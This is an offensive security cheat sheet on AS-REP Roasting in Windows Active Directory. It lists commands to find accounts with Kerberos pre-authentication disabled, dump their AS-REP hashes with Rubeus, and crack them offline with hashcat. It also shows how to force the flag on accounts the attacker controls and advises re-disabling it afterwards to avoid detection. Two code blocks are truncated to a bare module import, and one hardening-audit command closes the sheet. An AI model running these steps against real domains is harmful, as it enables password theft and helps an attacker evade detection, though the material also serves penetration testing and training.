# 09.02 AS-REP Roasting Windows

> Roast `DONT_REQ_PREAUTH` accounts with `Rubeus asreproast` — flip the flag first with `Set-DomainObject` for targeted attacks.

## Overview

Accounts with DONT_REQ_PREAUTH set will return an AS-REP encrypted with their password, allowing offline cracking without any prior authentication. PowerView enumerates vulnerable accounts; Rubeus requests the hash in Hashcat format. If GenericAll/GenericWrite is held over an account, Set-DomainObject can enable the flag before roasting (targeted AS-REPRoasting). Hash mode 18200 cracks the output.

## Steps

- Enumerate with PowerView Get-DomainUser -UACFilter DONT_REQ_PREAUTH to list accounts.
- Alternatively use Rubeus asreproast /format:hashcat to enumerate and dump all at once.
- Target a specific account with Rubeus /user /domain /dc /nowrap /outfile.
- If GenericAll/GenericWrite is held, enable the flag with Set-DomainObject -XOR @{useraccountcontrol=4194304}.
- Crack hashes offline with hashcat -m 18200 (Kerberos 5, etype 23, AS-REP).
- Re-disable the flag after targeted roasting to reduce detection footprint.

## Commands

### PowerView enumerate DONT_REQ_PREAUTH

```powershell
Import-Module .\PowerView.ps1
```

### Rubeus asreproast specific user

```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:<DOMAIN>.local /dc:dc01.<DOMAIN>.local /nowrap /outfile:hashes.txt
```

### hashcat crack AS-REP

```bash
hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
```

### Set DONT_REQ_PREAUTH (targeted)

```powershell
Import-Module .\PowerView.ps1
```

### Check pre-auth disabled (hardening audit)

```powershell
Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name
```
